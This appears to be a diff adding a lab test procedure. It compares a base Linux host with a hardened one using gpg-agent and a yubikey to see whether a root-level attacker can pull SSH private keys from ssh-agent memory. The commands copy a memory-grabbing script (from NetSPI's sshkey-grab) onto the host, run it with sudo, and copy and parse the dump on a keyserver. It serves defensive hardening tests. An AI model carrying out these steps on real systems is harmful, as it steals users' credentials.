@@ -1,0 +1,35 @@
+
+# assume the attacker has already compromised the host and elevated privileges
+
+___________________________________________________________________________________
+BASE SYSTEM
+___________________________________________________________________________________
+set keys in agent (as moe)
+1. (on LINUX-BASE) ssh-keygen -p -f ~/.ssh/id_rsa # set a password
+2. eval `ssh-agent`
+3. ssh-add ./.ssh/id_rsa # enter password
+4. shred ./.ssh/id_rsa      # optional, but it means the key is only in the agent
+5. ssh linux-base-server    # test to make sure the agent works
+(stay logged in as moe)
+
+read user key from memory (as Ansible user while moe still logged in)
+1. (on KEYSERVER) scp /plays/test-tools/grabagentmem.sh linux-base:~/
+2. (on LINUX-BASE) sudo ./grabagentmem.sh; chown -R ansible:ansible ~/
+3. (on KEYSERVER)  scp linux-base:~/* ~/
+4. (on KEYSERVER) /plays/test-tools/parse_mem.py [memfile] [outputlocation] 
+___________________________________________________________________________________
+HARDENED SYSTEM
+___________________________________________________________________________________
+
+set keys in agent (as moe)
+1. ssh linux-hardened-server    # test to make sure the gpg-agent works and the yubikey is connected
+(stay logged in as moe)
+
+read user key from memory (as Ansible user while moe still logged in)
+1. (on KEYSERVER) scp /plays/test-tools/grabagentmem.sh linux-hardened:~/
+2. (on LINUX-HARDENED) sudo ./grabagentmem.sh; chown -R ansible:ansible ~/
+3. (on KEYSERVER)  scp linux-hardened:~/* ~/
+4. (on KEYSERVER) /plays/test-tools/parse_mem.py [memfile] [outputlocation] 
+
+
+## NOTE THE grabagentmem.sh script is part of the sshkey-grab tool made by NetSPI and is available on Github at 
